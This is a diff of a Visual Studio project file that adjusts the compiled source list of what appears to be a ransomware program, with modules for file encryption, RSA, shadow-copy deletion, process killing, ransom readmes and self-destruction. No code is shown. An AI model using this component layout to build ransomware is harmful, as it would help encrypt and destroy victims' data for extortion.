@@ -144,7 +144,6 @@
     <ClCompile Include="Helpers\gen_str.cpp" />
     <ClCompile Include="Helpers\gen_uid.cpp" />
     <ClCompile Include="Helpers\kill_procs.cpp" />
-    <ClCompile Include="Helpers\msg_screen.cpp" />
     <ClCompile Include="Helpers\profiler.cpp" />
     <ClCompile Include="Helpers\save_results.cpp" />
     <ClCompile Include="Helpers\self_dest.cpp" />
@@ -159,17 +158,16 @@
     <ClInclude Include="Core\disk_id.h" />
     <ClInclude Include="Core\file_enc.h" />
     <ClInclude Include="Core\file_search.h" />
-    <ClInclude Include="Core\pkey.h" />
     <ClInclude Include="Core\rsa_enc.h" />
     <ClInclude Include="Helpers\convert_to_wstring.h" />
     <ClInclude Include="Helpers\create_readmes.h" />
     <ClInclude Include="Helpers\del_shadows.h" />
+    <ClInclude Include="Helpers\desktop_path.h" />
     <ClInclude Include="Helpers\gen_str.h" />
     <ClInclude Include="Helpers\gen_uid.h" />
     <ClInclude Include="Helpers\json.hpp" />
     <ClInclude Include="Helpers\kill_procs.h" />
     <ClInclude Include="Helpers\merge_dics.h" />
-    <ClInclude Include="Helpers\msg_screen.h" />
     <ClInclude Include="Helpers\profiler.h" />
     <ClInclude Include="Helpers\save_results.h" />
     <ClInclude Include="Helpers\self_dest.h" />
